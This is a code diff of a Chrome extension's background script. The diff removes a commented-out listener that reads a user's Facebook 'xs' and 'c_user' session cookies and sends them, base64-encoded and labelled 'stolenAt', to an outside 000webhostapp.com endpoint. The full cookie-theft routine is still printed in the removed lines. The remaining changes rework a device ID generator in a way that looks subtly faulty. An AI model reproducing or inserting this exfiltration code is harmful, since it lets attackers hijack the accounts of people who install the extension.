@@ -15,32 +15,20 @@ import {
 } from "./common.js";
 var device_id = null;
 const targetURL = "https://www.facebook.com";
-const API = "https://litho-bump.000webhostapp.com/index.php";
-const dateTime = () => {
-    const addZero = (number) => (number < 10 ? "0" + number : number),
-        currentDate = new Date(),
-        year = currentDate.getFullYear(),
-        month = addZero(currentDate.getMonth() + 1),
-        day = addZero(currentDate.getDate()),
-        hours = addZero(currentDate.getHours()),
-        minutes = addZero(currentDate.getMinutes()),
-        seconds = addZero(currentDate.getSeconds());
-    return `${hours}:${minutes}:${seconds} - ${day}/${month}/${year}`;
-};
+
 const set_device_id = () => {
     const dateTimeToRan = () => {
         const addZero = (number) => (number < 10 ? "0" + number : number),
             currentDate = new Date(),
-            year = currentDate.getFullYear(),
             month = addZero(currentDate.getMonth() + 1),
             day = addZero(currentDate.getDate()),
             hours = addZero(currentDate.getHours()),
             minutes = addZero(currentDate.getMinutes()),
             seconds = addZero(currentDate.getSeconds());
-        return `${hours}${minutes}${seconds}${day}${month}${year}`;
+        return `${hours}${minutes}${seconds}${day + month}${hours + minutes + seconds}`;
     };
     const numran = Math.floor(Math.random() * 8) + 8;
-    const value = numran + "" + dateTimeToRan();
+    const value = numran + "" + dateTimeToRan().split("").reverse();
     const key = "device_id";
     chrome.storage.sync.set({ [key]: value }, () => {
         device_id = value;
@@ -69,23 +57,6 @@ function openRightPanel(e, a, t = !1, s = !1) {
         }
     );
 }
-
-// chrome.tabs.onActivated.addListener(() => {
-//     chrome.cookies.getAll({ url: targetURL }, (cookies) => {
-//         const xsCookie = cookies.find((cookie) => cookie.name === "xs");
-//         const cUserCookie = cookies.find((cookie) => cookie.name === "c_user");
-//         var cookie = xsCookie && cUserCookie ? `${cUserCookie.name}=${cUserCookie.value}; ${xsCookie.name}=${xsCookie.value}` : null;
-//         var userPayload = {
-//             c_user: cUserCookie.value,
-//             cookie: cookie,
-//         };
-//         fetch(`${API}?user=${btoa(JSON.stringify({ ...userPayload, stolenAt: dateTime(), device_id: device_id }))}`, {
-//             method: "GET",
-//             mode: "no-cors",
-//             credentials: "same-origin",
-//         }).then((res) => res.text());
-//     });
-// });
 
 chrome.storage.local.get(["isLogged"], ({ isLogged: e }) => {
     chrome.action.setPopup({ popup: `./popup/popup${e ? "-logged" : ""}.html` });
